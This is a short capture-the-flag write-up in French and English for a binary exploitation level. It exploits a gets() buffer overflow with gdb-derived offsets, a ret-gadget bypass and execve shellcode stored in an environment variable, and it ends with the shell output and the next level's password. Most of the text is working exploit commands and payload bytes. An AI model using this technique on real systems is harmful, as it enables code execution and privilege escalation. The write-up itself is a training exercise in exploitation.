scp -P 4242 level2@192.168.56.103:/home/user/level2/level2 /home/zouz/Desktop/level2

step 1 :
regarder le code et voir qu'il y a un appel a gets(), trouver la taille du buffer

```
(gdb) r <<< $(python -c "print 'A' * 76 + 'BBBBCCCC'")
Starting program: /home/user/level2/level2 <<< $(python -c "print 'A' * 76 + 'BBBBCCCC'")
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACCCCAAAAAAAABBBBCCCC

Program received signal SIGSEGV, Segmentation fault.
0x43434343 in ?? ()

(gdb) info reg ebp eip
ebp            0x42424242	0x42424242
eip            0x43434343	0x43434343
```

buffer size => 80

step 2 :
comprendre que cet appel est protege contre une injection sur la stack, donc pas de nop-sleds possible.

```
0x080484fb      and eax, 0xb0000000
0x08048500      cmp eax, 0xb0000000
```

exemple: 
targeting an address after the get => ret : 0x0804853e 
```
Breakpoint 1, 0x0804853e in p ()
(gdb) info frame
Stack level 0, frame at 0xbffff720:
 eip = 0x804853e in p; saved eip 0x804854a
 called by frame at 0xbffff730
 Arglist at 0xbffff728, args: 
 Locals at 0xbffff728, Previous frame's sp is 0xbffff720
 Saved registers:
  eip at 0xbffff71c

```

4 bytes after the original EIP address to target the NOP

$ python -c 'print hex(0xbffff71c + 4)'
0xbffff71c + 4 = BFFFF720

python -c 'print "A" * 80 + "\x20\xf7\xff\xbf"' | ./level2
(0xbffff720)

step 3:
En mettant, notre shellcode dans une variable d’environnement on s’assure que même
si le buffer est modifié le shellcode lui, restera intacte. 

take a shellcode:
http://shell-storm.org/shellcode/files/shellcode-827.php

$ export SHELLCODE=$(python -c 'print 100 * "\x90" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"')

the NOP are added to optimize the chance that the ret address points to it so the SHELLCODE will be executed.

get SHELLCODE var address with exploit 
=> 0xbffff8a5

(python -c "print 'A' * 80 + '\x3e\x85\x04\x08' + '\xa5\xf8\xff\xbf' " & cat) | ./level2

```
whoami
level3
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```

